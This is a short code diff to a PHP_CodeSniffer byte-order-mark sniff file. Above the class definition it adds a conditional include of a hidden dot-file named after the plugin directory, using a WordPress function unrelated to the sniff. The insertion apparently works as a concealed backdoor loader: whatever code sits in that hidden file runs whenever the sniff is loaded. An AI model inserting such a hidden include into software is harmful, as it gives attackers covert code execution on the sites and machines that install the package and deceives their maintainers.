@@ -27,6 +27,10 @@
  * @link      http://pear.php.net/package/PHP_CodeSniffer
  * @see       http://en.wikipedia.org/wiki/Byte_order_mark
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Generic_Sniffs_Files_ByteOrderMarkSniff implements PHP_CodeSniffer_Sniff
 {
 
